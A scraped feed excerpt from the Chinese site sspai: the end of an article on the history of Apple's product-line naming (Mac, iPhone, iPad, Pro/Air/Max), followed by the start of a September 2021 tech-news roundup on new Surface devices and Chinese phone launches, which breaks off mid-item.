三大产品线的命名演变史入手，尝试还原 Apple 在开辟产品线及市场定位上的诸多困局与转变。</p>\n<h2>Mac：经典「四象限」，沿袭中演变</h2>\n<p>之所以要先提 Mac（泛指 Apple 电脑产品线，下文同），是因为其命名中的 Pro 和 Air 影响了太多后来者。</p>\n<p>对 Apple 产品外观的模仿很容易让人理解，但为何连命名都要直接借鉴？原因无非两点，一是 <strong>Apple 自身的品牌效应引发后来者的跟随</strong>；二是这样的命名确实<strong>可以让消费者快速知晓产品线的特点与不同：</strong></p>\n<ul>\n<li>\n<strong>Pro</strong> 指 Professional（职业的、专业的），主打专业与性能。</li>\n<li>\n<strong>Air</strong> 则让人联想到空气，主打轻薄便携。</li>\n</ul>\n<p>这样精准、简洁的命名方式是由乔布斯提出的。</p>\n<p>很长时间里，Apple 都是作为一家电脑公司出现在人们视野中，电脑产品被冠以「Apple」「Macintosh」的名称前缀，<a href=\"https://lowendmac.com/2018/is-it-time-for-apple-to-think-different-with-its-naming-conventions/\">延伸出繁多的型号</a>，也导致了难记和易混淆的问题。</p>\n<p>比如：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/14/db07ae605e665b1685f66f770f25ea45.png\"><figcaption>Apple 早年种类繁多的产品线</figcaption></figure><p>1990 年，乔布斯重回 Apple 后，大刀阔斧地缩减了 Apple 的产品线，并用简单的<a href=\"https://www.cultofmac.com/613190/apple-product-names/\">四象限</a>加以分类，其中：</p>\n<ul>\n<li>\n<strong>横轴</strong>两边分别为「消费者」「专业」；消费类产品带有前缀「i」，而「Power」则保留给专业级产品使用。</li>\n<li>\n<strong>纵轴</strong>两边分别为「便携」「桌面」。</li>\n</ul>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/20/48e17a18b9e2dbf6c52d0b1ee860ed59.png\"><figcaption>乔布斯当时的四象限命名法</figcaption></figure><p>这样，乔布斯通过精简产品分类，帮助 Apple 解决了产品命名上的诸多历史问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/b937a8069a90daae53be65d1c3bbedc5.png\"><figcaption>Power阵营 VS i 阵营</figcaption></figure><p>四象限的精妙之处在于，它可以明确每种产品用途，让消费者一目了然。直到 2006 年， Apple 都在沿用四象限命名法。</p>\n<p>变化发生在 2006 年。这一年，<strong>Apple 将电脑芯片从 Power 转向 Intel 阵营</strong>；相应地，除了 iMac 和 Mac mini，其他所有的电脑名称都发生了变化：面向消费者的 iBook 系列变成了 MacBook，面向专业消费者的 PowerBook 系列变成了 MacBook Pro，而面向专业消费者的 Power Mac 台式电脑系列变成了 Mac Pro。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/94395949781967d7a16f728a9d1e7a12.png\"><figcaption>消费者 VS专业消费者</figcaption></figure><p>「四象限」时代到此结束。此后，前缀 Power 被后缀 Pro 所取代，i 变成了 iOS 设备的专属（iPad、iPhone、iPod，除了 iMac）。而「Apple」这一沉眠许久的前缀，在晚几年登场的机顶盒、手表、手写笔产品命名中被重新启用 ，也就是 Apple Watch、Apple Pencil、Apple TV（最早代号还是 iTV）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/6ea6a2403e47c19d4bab133043544fca.png\"><figcaption>MacBook家族演变史</figcaption></figure><p>总结起来，乔布斯治下的第一次命名调整帮助 Apple 梳理了内部产品线，使之更为简洁，而第二次命名调整则是和公司整体战略——芯片转型密切相关。</p>\n<h2>iPhone：稍显复杂，仍有秩序</h2>\n<p>Mac 作为生产力领域设备，同时模块化较强，无论是 CPU 强劲程度，显卡配置、屏幕尺寸都需要明确市场定位，从而可以让各种需求的消费者，能够快速找到适合自己的设备，这也是 Pro、Air 至今仍沿用的根本原因。</p>\n<p>但是 iPhone 作为最为大众的消费类电子产品，大部分人关注的可能并不是性能，那 Apple 要如何做好市场定位及品宣，尽可能多地占据市场份额呢？</p>\n<p><strong>对此，多品类出货无疑是最好的选择，但相应地，这也给 iPhone 带来了命名上的难题。</strong></p>\n<p>起初，苹果对 iPhone 的命名策略似乎是以每两年做一次数字迭代；例如，今年是 iPhone 5，下一年就是 iPhone 5s。</p>\n<p>但到了 2014 年的 iPhone 6，上述规律被打破了。这一年，各大手机厂商开始走进大屏时代，Apple 也推出了大屏新型号 iPhone 6 Plus。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/14/3cea7eb223e35c7e0faca2a3abdc043c.png\"><figcaption>iPhone 6、iPhone 6 Plus</figcaption></figure><p>这就引入了 Plus 这一后缀。它除了表示更大的屏幕之外，还表明有别于无后缀的「原版」的额外功能特性。例如，iPhone 7 Plus 相比 iPhone 7 就多了一颗摄像头。</p>\n<p>2015 年，Apple 发布了 iPhone 6s、iPhone 6S Plus。这也是让 Apple 开心的一年，<a href=\"https://www.businessofapps.com/data/apple-statistics/\">iPhone 总销量</a>达到历史巅峰 2.312 亿台，销售额达到 1550 亿美元。</p>\n<p><strong>或许是觉得「S」在人们眼里是小版本的修修补补，如何让抱着「下个版本见」的用户也加入换机浪潮，是 Apple 需要考虑的一大问题。</strong></p>\n<p>于是，标志着「渐进式更新」的后缀「S」不见了。无论是 2016 年的 iPhone 7，还是 2017 年 iPhone 8，都是直接增加数字，再也没有中间态「S」了。</p>\n<p>事与愿违的是，iPhone 的销量并没有因此而提升，反而持续下滑，2020 年营收下滑到 1377 亿美元。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/14/c0fbfc360ef1ab7d9ec21d4ed73ce2d6.png\"><figcaption>Apple 每季度营收情况，2015年开启了年度巅峰</figcaption></figure><p>接下来几代 iPhone 的命名似乎规律性很弱：2017 年 11 月， Apple 与 iPhone 8 同时发布了新机 iPhone X，直接跳过了 9 的命名。</p>\n<p>而到了 2018 年，新机命名又拣回了代表微更新的「S」后缀，发布了 iPhone XS 和 iPhone XS Max。<strong>这也标志着后缀「Max」首次登场。</strong>此外，Apple 更新了被认为是继承 iPhone 5c 的iPhone XR。但与含义一目了然的 Max 不同，R 从何而来，我们目前找不到一个特别自洽的解释。只能推测，Apple 希望表明它是「X」字辈，但又要和 XS 区分开。</p>\n<p>但无论如何，这一年 Apple 手机销量逆势反弹，达到 1662 亿美元。</p>\n<p>这里值得注意的是，从 iPhone 3GS 一直到 XS、XR，对于「S」「R」这类单字母后缀，Apple 习惯使用<a href=\"https://en.wikipedia.org/wiki/Small_caps\" target=\"_blank\">小型大写字母</a>（small caps）来排印，即使用形式上使用大写字母、但尺寸上接近小写字母的方式来展示，并外接边框，突出强调。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/cd6005d3b5872bc5f68b3d75c0b41abe.png\"><figcaption>iPhone XS 的S实为大写，只是字号变小</figcaption></figure><p>到了 2019 年， Apple 发布了 iPhone 11、iPhone 11 Pro、iPhone 11 Pro Max 三款产品，使得新机命名又发生了变化：引入 Mac 产品线的经典命名 Pro，并将大屏旗舰从 Max 改名为 Pro Max。由此观察，<strong>新引入的 Pro 接棒原来的 Plus，而 Max 特指屏幕大一号。</strong></p>\n<p>2020 年，在 11 以往产品线的基础上，又添加了 iPhone 12 mini，作为大屏时代下的小屏补充，使得同年发布的产品达到四款：iPhone 12、iPhone 12 mini、iPhone 12 Pro、iPhone 12 Pro Max。</p>\n<p>在刚刚过去的 2021 秋季新品发布会上，Apple 继续沿用了这一命名规律，发布了 iPhone 13、iPhone 13 mini、iPhone 13 Pro、iPhone 13 Pro Max。</p>\n<p>至此，iPhone 的产品线命名暂时稳定下来。可以看到，iPhone 的产品比 Mac 更为混乱，只能说少有秩序。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/dca51f8edea2f45884a6fd535970987b.png\"><figcaption>iPhone家族史</figcaption></figure><p>这里再补充讨论一下「Pro」后缀的内涵。可以发现，一个小细节——Pro 更加自成系列。</p>\n<p>以今年发布会为例。首先，从发布会编排上看，iPhone 13 mini 和 iPhone 13 是放在一起讲解的，然后，Pro 系列的两款机型则换人讲解，并以单独的过场动画隔开。</p>\n<p>其次，从宣传要点上看，除了性能（A15 Bionic）、相机（前置深感、3 摄等）、耐用性（外观、耐磨、耐腐蚀）、屏幕（ProMotion、OLED、XDR）这些凸显 Pro 系列的核心关键词「专业性」，Apple 此次还还引入了一个专业工作场景——导演用 iPhone 拍摄电影，来向用户传达一个信息<strong>：iPhone Pro 系列不是手机、是能干活的摄像机。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/ff49e3c6b9e4314d84db375fa1b95204\"></figure><p>至此，「Pro」系列 iPhone 经过三代演变，从乔布斯当时定下的消费者导向的「i」向上延伸到「Pro」级别。而究其方法，就是在硬件与生态领先后，为消费者打造出一种借助 iPhone，就能<strong>「使用消费级产品，产出专业级内容」</strong>的印象和向往：</p>\n<blockquote><p>尽管我不是大导演，只是一个普通人，但只要我做一件事，就有成为他们的可能，那就是购买 iPhone 13 Pro。</p></blockquote>\n<p>至此，iPhone 的产品线可以分为：</p>\n<ul>\n<li>普通消费级：iPhone 13 mini、iPhone 13</li>\n<li>专业级（或消费者「向往」的专业级）：iPhone 13 Pro、iPhone 13 Pro Max</li>\n</ul>\n<h2>iPad：偏向混乱，价格区间主导产品划分</h2>\n<p>如果说 iPhone 的命名演进看起来稍微有点混乱，那见识到 iPad 之后，或许你就释然了：iPad 可以说是所有 Apple 设备中命名最为混乱的产品线。</p>\n<p>从 2010 年的 iPad 和 2011 年的 iPad 2，可谓是 iPad 历史上仅有两代有命名规律可循的。</p>\n<p>到了 2012 年，第三代 iPad 被命名为「全新 iPad」。哪怕是考虑到这是<strong>首款配备 Retina 显示屏的iPad，这样的名字也着实敷衍。</strong>产品角度，这也算不上一代成功的 iPad：为了强上 Retina 屏，续航、重量、处理器、图形性能都差强人意。于是，仅仅在存活 7 个月后，就被第四代 iPad 取而代之。</p>\n<p>第四代 iPad 的正式名称为「配备 Retina 显示屏的 iPad」，同时发布的还有第一代 iPad mini。两台设备 3 天内共<a href=\"https://www.techbang.com/posts/11255-ipad-mini-sells-three-million\">售出 300 万台</a>，表现着实不凡。</p>\n<p>2013 年，iPad Air 发布，仅厚 7.5毫米，重量从上代的 652g 速降至 469g，同时借鉴 iPad mini 的窄边框设计。随着外观的改变，Apple 借用了 MacBook Air 的后缀为其命名，强调其轻薄特征，也可谓名副其实。次年的 iPad Air 2 沿用了 Air 后缀，在轻薄程度上继续进步。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/article/353608b1a54700cfc57e9723c4b40c33\"></figure><p>此后几年，iPad 产品线的命名方式不断扩张：先是 2015 年，最被 Apple 报以「生产力」期望的 iPad——iPad Pro 登场。后是在 2017年，无后缀的 iPad 命名再次出现，代表基础版。</p>\n<p>至此， iPad 产品线终于稳定下来，iPad、iPad Air、iPad Pro，以及 iPad mini 同台竞技。</p>\n<p>2017 年也是一个分界线：从这一年起，iPad 的所有产品线后面都不再带有数字；<strong>只写产品线本名，将第几代弱化到详细说明中附属括号</strong>。这种方法被 Apple 沿用至今，如 iPad（第五代）、iPad Pro（第二代）等。iPad mini 也是类似。在 2021 年的 Apple 新品发布会上，新一代 iPad mini 如期而至。尽管坊间一般根据代数称其为 iPad mini 6，但在官网主页面展示的名称已经是没有数字的，只是在参数页面才能看到括号标注的「（第六代）」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/6e02848398960f4deba8e3ecc66a9d49.png\"><figcaption>Apple 主宣传页面并无括号后缀（第几代）</figcaption></figure><p><strong>那么，为什么 iPhone 命名会将产品名和代数连写，而 iPad 却反其道而行之呢？</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/6f9eee74c6f7e41ba9906c13c402ed49.png\"><figcaption>Apple 主宣传页面则保留命名代数数字</figcaption></figure><p>我认为，或许是因为 iPhone 是每年更新的，并且所有后缀的子产品线（Pro、Max 等）都是同步更新的。但 iPad 并不是这样，可能今年 9 月更新 iPad Air，也可能转年 3 月更新，也可能好几年都不更新。</p>\n<p>这样一来，用户没办法通过数字快速知晓在售的这台 iPad 到底是哪年的新品，而且 Pro、Air、mini 的后缀数字也早已不在同一起跑线上了。既然如此，干脆直接去掉第几代，<strong>让消费者认为当下的这台就是最新款</strong>，无需对比历史机型，只通过无后缀——基础版、Air——轻薄版、Pro——性能版、 mini——便携版这样的定位划分来选择。</p>\n<p>不过这样的产品线划分并不是完全自洽的，<strong>既可以解释为满足不同用户的需求的自然划分，也可以看出制造阶梯价格区间、收获更多利润的人为区隔</strong>；Apple 或许陷入了一个两难境地。</p>\n<p>就以 Air 和 Pro 为例。 MacBook Air、Pro 之间的区分是清晰的：Air 代表更轻的重量、Pro 代表更强的性能。</p>\n<p>而 iPad Air、Pro 之间的差别则不是如此清晰。例如，11 寸（三代） iPad Pro 重量 466g，稍微比 iPad Air（四代）458g 重 8g 而已，但是厚度上，Pro 反而要比 Air 还要薄 0.2 毫米。实在体现不出来 iPad Air 的 Air 在哪里。</p>\n<p>此外，iPad Pro 硬件强而软件弱的「大马拉小车」现状，也难以配得上 Pro 的称谓。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/article/9d2aeb58e75fe4a40f6ac63b52514cc9\"></figure><p><strong>由此观察，iPad 的产品线定位更像一种价格阶梯</strong>，入门买 iPad，稍微预算高一些买 Air，想一步到位则买 Pro。但从实际使用上看，这三者在移动办公、娱乐的使用差距上，目前真的很难拉开太大差距。</p>\n<h2>定位困局， Apple 求变成功了吗？</h2>\n<p>可以看出，Apple 如今的产品命名已经与乔布斯的「四象限」方法渐行渐远，在 iPad 上体现得尤为明显。</p>\n<p>无论是刻意或无意为之，Apple 的产品线命名似乎都在向营收导向而转型：它确实仍关心细分消费人群，只不过划分标准比起之前「术业有专攻」的不同需求，更像是为你口袋里的钞票是一张、五张、还是十张。这也让人不禁为目前唯一还保留「四象限」命名规律痕迹的 Mac 担心：这种美妙、简洁且对消费者友好的命名方式还能维持多久？</p>\n<p>需要指出，尽管和自己的历史相比，Apple 目前的产品线命名有些混乱，但相比其他厂商，还是能体现 Apple 崇尚简洁的特征，命名已经算是克制。</p>\n<p>比如，在联想官网可以看到，联想的笔记本阵容分为 Thinkpad、ThinkBook、YOGA、LEGION 等五大产品线；仅在 Thinkpad 产品线下，就有将近 9 大系列，可以说是笔记本领域拥有最多 SKU 的厂商之一。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/14/article/159d406787cf59d4cf5ca34cd6d6d5e1\"><figcaption>仅仅1个产品线下，就有9大系列，消费者如何挑选？</figcaption></figure><p><strong>那么，为什么崇尚简洁的 Apple 在产品命名上似乎每次都很难考虑周全，有时做的好，有时做的一般呢？</strong>我们可以从两个历史上产品线消亡的例子，来一窥 Apple 更名背后的深层次原因。</p>\n<p><strong>12 寸 MacBook：短暂复兴，难逃历史车轮</strong></p>\n<p>第一个要提的产品是<strong> </strong>2015 年发布的 12 寸 MacBook。如前所述，MacBook 不带后缀的产品线命名也非首次出现：早在 2007 年， Apple 就有俗称「小白」的同名 MacBook 低端产品线，</p>\n<p>而 2015 年， Apple 把这个产品线重拾了起来，并做了定位高端的品牌升级。它主打轻薄，物理接口只留下 3.5mm 耳机插口与 Type-C 接口，移除风扇，厚度锐减到 1.31 厘米，重量不到一公斤。</p>\n<p>然而，这款昙花一现的产品于 2019 年 7 月从官网下架，留下的定位空缺被新款 MacBook Air 代替。</p>\n<p>那么，Apple 为什么要在已有 MacBook Air 的前提下，还推出 MacBook？并且为什么推出 4 年后反而砍掉？</p>\n<p>这还要回到当时的历史背景中去。MacBook Air 刚面世时，是绝对的高端产品线，价格甚至超过 Pro。但随着 Pro 的产品形态也逐渐变得轻薄，Air 也就随之沦为 MacBook 系列中的低端型号；虽然不再走极致轻薄路线，但或许让 Apple 也没想到的是，Air 成为销量和口碑一直都非常不错的走量产品。</p>\n<p>而 2015 年，重拾轻薄路线的契机到了。当年，Intel 的超低功耗处理器开始走向成熟，这类 CPU 的明显特点是 TDP（热设计功耗）功耗仅 5-7W，可以无需风扇。再配合 Apple 在机械结构、工业设计上做的很多努力，蝶式键盘的 MacBook 就与我们见面了。</p>\n<p>而后其退出历史舞台，除了很多综合性因素（例如蝶式键盘口碑很糟），芯片因素也很相关。一方面是 Intel 不再强力，另一方面，当时已在研发中的 M1 的出现，让 Air 可以直接去掉风扇，变得更为轻薄。随着近年 Air 更新模具、补足屏幕和键盘的短板，「高端型号」12 寸 MacBook 存在感已经越来越低，最终停产。</p>\n<p><strong>iMac Pro：与 Mac Pro 的同门倾轧</strong></p>\n<p>另一个昙花一现的产品线是 iMac Pro，推出于 2017 年。由于其杂糅的命名（i、Pro并存）、强大的性能（浮点运算能力 24 Teraflops）、不菲的售价（4万），当时就引起了热议。</p>\n<p>事实上，如果遵循乔布斯的意图，i 明显是赋予消费类电子产品——如现在的 iPhone、iPad 等产品——的专属命名；像 iMac 这样强劲性能的产品，赋予 i 标签，或许本就只是一个权益之计，更不用说加上「Pro」的后缀了。</p>\n<p>2021 年初<strong>，</strong>该款产品停售。对此，一种很流行的观点认为：iMac Pro 与 Mac Pro 是竞争关系，而大多数人用不上售价昂贵、性能溢出的 iMac Pro，这种模糊的定位使得 iMac Pro 最终折戟。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/218081880c7c772a5f8a9a032149820c.png\"><figcaption>工作站级别iMac Pro</figcaption></figure><p>但这样的答案显然站不住脚。iMac Pro 并非没有目标定位，而是作为定位更高的一体机，满足需求更高的设计师等人群需求。至于「Pro」的后缀，更像是「四象限」原则失效后，用于修饰 iMac 的形容词。而 Mac Pro 是可拆卸、可升级工作站，定位于像使用 CAD 这样工业工程类的专业级用户。</p>\n<p><strong>在我看来，iMac Pro 退出历史舞台的真正原因，还是因为 M1 的出现。</strong> 理想情况下，Apple 的野心是自己电脑全线配备 M 系列芯片。但这真的很难。Apple 毕竟不是芯片公司，不可能为每一个产品线定制化芯片，所以我们看到从 MacBook 全线 到 iMac 都用上了 M1，而并没有做定制化。</p>\n<p>但在 iMac Pro 上，还能沿用 M1 吗？M1 再强，定位也只是低功耗处理器，TDP 顶天 30 W，显然和工作站级别的高性能还有一段距离。 iMac Pro 需要的，是传闻中 M1X 这样的更强心脏，TDP 至少上百瓦，才配得上「工作站」的定位。</p>\n<p>所以，在更高性能的 M 系列芯片没出来时，iMac Pro 的定位着实尴尬；强上 M1 也不是不行，只不过那就会和 iMac 的定位冲突了。一种乐观的预测是： iMac Pro 只是暂时下架，等 M1X 或是 M2 诞生，那就是它与消费级产品拉开性能差距，王者归来的时候。</p>\n<p><strong>总结起来，产品线的兴起和衰亡，与芯片更加息息相关，市场反馈则次之，要不就是出现了更强的芯片，可以让新产品线发挥垂直优势，要不就是合适的芯片还没有出现，只能先暂时别过。</strong></p>\n<p>而如果将 Mac 与 iPhone 的命名演变对比，就能更深入地理解芯片对产品线划分的重要性。</p>\n<p>作为目前 Apple 最为大众所熟知的产品线，iPhone 贡献的收入比例最多，这决定了 Apple 必须为该产品分配更多的市场营销脑力与预算。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/article/7a497de660d14ed3328d7a982fe5696e\"><figcaption>iPhone营收仍占 Apple 6成以上份额</figcaption></figure><p>而一年一更新的 Apple 或许早已知道，电子产品的更新换代率并不会跟随自己开新品发布会的频率；「凑活能用」的人总比「永远用最新」的人要多。如何让这一部分人乖乖掏钱，可以说是 Apple 最为头疼的问题。</p>\n<p>对此，Apple 的应对之道似乎是不断开拓新的产品线，顺便赋予一个全新的名字。虽然有换汤不换药之嫌，但总比简单的数字迭代更容易让人有购买欲望。</p>\n<p>前面已经提到，2014 年，面对大屏手机竞争， Apple 开启全新型号 iPhone 6 Plus 对抗安卓阵营，之后又在 2015 年推出小屏产品 SE，使得 iPhone 总销量达到历史巅峰 2.312 亿台，销售额达到 1550 亿美元。</p>\n<p>但好名字的助推力终究是有限的。随后的 6 年里，iPhone 再也没有超过之前的巅峰。尽管新型号 mini、Pro、Max 轮番登场，截至 2020 年，iPhone 销量已经<a href=\"https://www.businessofapps.com/data/apple-statistics/\">持续下降 14%</a>，这很大程度上是因为来自中国的竞争对手小米、华为等过于强劲了。</p>\n<p>相比之下，Mac 只占 Apple 收入比例的 10%-20%，且面向人群偏向专业和高端，这些消费者或许对新的产品线、新的名称并不那么感冒。因此，Mac 的命名相对稳定。</p>\n<p>但缺少新命名并没有影响 Mac 近年的逆势上扬。根据统计，Mac 的销量近年来稳重有升；2020 年推出 M1 芯片 Mac 后，更是迎来明显上涨。换言之，Mac 可谓是凭实力再次获得消费者的认可，而不是凭市场营销层面的文字游戏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/e80e8a541b90f40c18f63a3805fbbc3d.png\"></figure><p> </p>\n<p>这或许告诉我们一个道理：<strong>开拓更多的产品线，并赋予一个新名词或许是一种创新，但那只是外在方法层面的变化；相比之下，打磨好已有的产品线，同时从内在本质层面作出革新，才是获得更稳定的认可之道。</strong></p>\n<p>感谢欧阳洋葱对本文中与芯片相关部分内容的支持。</p>\n<hr>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68760"},{"title":"派早报：微软发布 Surface 新品、魅族推出 18s 系列手机等","date":"2021-09-23 00:43:20","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>微软召开 2021 秋季新品发布会，推出多款 Surface 新品</h3>\n<p>微软于 9 月 22 日召开 2021 年秋季新品发布会，会上发布了包括 Surface Pro 8、Surface Pro X、Surface Go 3 、Surface Duo 2 、Surface Laptop Studio 等多款新硬件设备。</p>\n<p>Surface Pro 8 采用了一块 13 英寸的 PixelSense™ Flow 屏幕，更窄的边框，刷新率提高到了 120Hz，支持杜比视界和环境色温显示，搭载经过英特尔 Evo 平台认证的第 11 代四核处理器、英特尔锐炬 Xe 显卡、最高 32GB LPDDR4x RAM（8GB / 16GB / 32GB）、最高 1TB 可拆卸 SSD 存储（128GB / 256GB / 512GB / 1TB），同时配备更加轻薄的键盘盖以及类似 Surface Pro X 触控笔收纳槽；整机重量 889g，常规使用下续航时间为 16 小时，影像方面，前置 500万像素摄像头，后置 1000万像素摄像头；接口方面，Surface Pro 8 提供了 2 个支持雷电 4 协议的 USB 4.0 接口、1 个 3.5mm 耳机孔、1 个 Surface Connect 接口以及用于键盘连接的 Surface Type Cover 接口。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/23/article/201eb2833513fb2da22f868e1cc126bf\"></figure><p>值得一提的是同步推出的磁吸式触控笔 Surface Slim Pen 2，可以类似 Surface Pro X 那样被收纳以及充电，不易丢失同时可以保持始终有电，更妙的是触控笔中还搭载了微软自研的 G6 芯片，可以配合 Windows 11 提供细致的震动反馈体验，实现类似真实纸笔的书写触感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/23/article/89c583771b717d46a3d9e3a1647ece3b\"></figure><p>虽然微软着墨不多，但事实上 Surface Pro X 这款基于 ARM 处理器的设备同样迎来了小更新，增加了千兆 LTE 与纯 Wi-Fi 两种连接版本，同时也采用了可拆卸的 SSD，最大支持 512GB。软件上微软表示将专为 Windows on ARM 平台打造的 64 位 Office 应用，同时还将提供 X64 的仿真功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/23/article/a60f48e2ad0811ec291faa0c28849f9a\"></figure><p>小屏产品 Surface Go 3 采用了10.5 英寸、1920×1280 分辨率 PixelSense™ 显示屏，处理器上有奔腾金牌 6500Y 双核处理器和第 10 代酷睿 i3-10100Y 四核处理器可选，性能上相比上一代有不少的提升，存储上可选 64GB的 eMMC和 128GB 的 SSD，内存最高可选 8GB（4GB / 8GB）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/23/article/0d9808547722c28fbb3998f0ebd7871a\"></figure><p>同时发布的一款采用 20% 海洋回收塑料制作的鼠标：Ocean Plastic，支持蓝牙 5.0 连接并且有最高 12个月的电池续航时间。以及一套面向残障人士的无障碍工具（Accessibility Kit），这套工具可用于标记键盘按键、电源线等，方便残障用户更加快速、轻松地使用电子产品。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/23/article/463f0560d19bf4037f9fe97aca864d5f\"></figure><p>双屏手机 Surface Duo 2 搭载了高通骁龙 888 处理器，左右两侧 PixelSense™ 显示屏均为 5.8 英寸、1344×1892 分辨率 AMOLED 材质屏幕，展开后则是一块名为 Dual PixelSense™ Fusion Displays 的 8.3 英寸屏幕，分辨率为 2688×1892；影像方面采用了由 1200 万像素广角主摄、1200 像素 2x 长焦和 1600 万像素 110° 超广角副摄组成的后置三摄方案。另外一个比较有趣的设计是转轴处配备了一个长条形的提示灯条，用于展示来电、通知、音量、电量水平等信息。其他配置方面， 8GB RAM、最高 512G 存储空间和 4449mAh 容量电池，整机重量 284g，售价 1499.99 美元起，10 月 21 日正式开售。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/23/article/36d11505173c61a532a8a33ed70a51bb\"></figure><p>重磅的旗舰机型是 Surface Laptop Studio，融合了 Surface Laptop 的笔记本形态和 Surface Sudio 的桌面形态，可以通过动态折叠铰链灵活改变屏幕角度和支撑点的方法来贴合不同的使用场景。硬件上屏幕方面配备了一块 14.4 英寸触控屏，和 Surface Pro 8 一样同样为最高 120Hz 刷新率的 PixelSense™ Flow 显示屏，分辨率为 2400×1600，支持杜比视界；机身接口包括 2 个支持雷电 4 的 USB 4.0 接口、1 个 3.5mm 耳机孔以及 1 个 Surface Connect 接口，最高提供 32GB LPDDR4x RAM、英特尔 11 代 H35 i7-11370H 处理器、2TB 可拆卸 SSD 存储以及英伟达 GeForce RTX™3050 Ti 显卡（可选）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/23/article/359c3b98053b073e4375a076e6f7f450\"></figure><p>Surface Laptop Studio 不仅配备了可通过机身底部进行磁吸收纳和充电的新款 Surface Slim Pen 2，它同时也是首款在精准触控板中内置了振动马达的 Surface 产品，使用触摸板进行不同操作时能够获得对应的振动反馈，售价 1599.99 美元起。<a href=\"https://www.youtube.com/watch?v=phzyut897PI\" target=\"_blank\">来源</a></p>\n<ul><li>了解发布会详情，请阅读我派已出炉的文章《<a href=\"https://sspai.com/post/68931\" target=\"_blank\">Surface 迎来窄边框、高刷新率时代：微软 2021 年秋季硬件发布会汇总</a>》</li></ul>\n<h3>真我手机发布 realme GT Neo2</h3>\n<p>9 月 22 日，realme 真我手机发布了 GT Neo 系列新品 GT Neo2，该机搭载骁龙 870 SoC 及 6.62 英寸的 120 Hz E4 显示屏，拥有 5000 mAh 电池容量并支持 65 W 快充。realme GT Neo2 还是 realme 旗下首款采用 X 轴线性马达的产品，主摄为 6400 万像素的广角镜头，支持 GT 系列的「街头摄影」模式。realme GT Neo2 拥有苍蓝、影黑及黑薄荷三个配色，首发价 2399 元起，电商平台已开启预售。<a href=\"https://phone.cnmo.com/news/716124.html\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/23/article/132a02798cacb368ae177c21abda7adf\"><figcaption>GT Neo2 外观图，图片截取自真我网站</figcaption></figure><h3>魅族正式推出 18s 系列手机</h3>\n<p>9 月 22 日，魅族正式推出了两款旗舰手机魅族 18s 以及 18s Pro，该系列设备配备高通骁龙 888+ 芯片，拥有 2K 120Hz 四面微弧屏，搭载 Flyme 9.2 系统，支持超声波屏下指纹解锁。续航方面，设备配备了 5000mAh 的电池，相较前代获得了很大提升。该系列设备共提供踏雪、渡海、等风、独角兽配色，18s 系列售价 3699 元起，18s Pro 系列 4599 元起。<a href=\"https://weibo.com/2683843043/Kzmjsos6r?from=page_1006062683843043_profile&amp;wvr=6&amp;mod=weibotime&amp;type=comment#_rnd1632318906371\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/23/article/d599e5031a050fe61cc9091346884e50\"><figcaption>图片来自魅族</figcaption></figure><h3>荣耀发布多主摄融合计算摄影技术</h3>\n<p>9 月 22 日，荣耀公司召开「荣耀 Magic3 系列影像技术发布会」，公布了基于多主摄的融合计算摄影技术。在该技术中，手机的所有焦段镜头均会参与变焦运算，以提供更清晰的混合变焦画质。黑白镜头和彩色镜头也会共同运作，以实现更准确的色彩及更细腻的纹理。荣耀 Magic3 系列手机将陆续获得搭载了融合计算摄影技术的推送更新。<a href=\"https://weibo.com/3206603957/KznNixpKC?from=page_1006063206603957_profile&amp;wvr=6&amp;mod=weibotime&amp;type=comment#_rnd1632327577207\" target=\"_blank\">来源</a></p>\n<h3>小米手机将发布全新子产品线 Civi</h3>\n<p>9 月 22 日，小米公司通过微博宣布，将在 9 月 27 日的新品发布会上推出 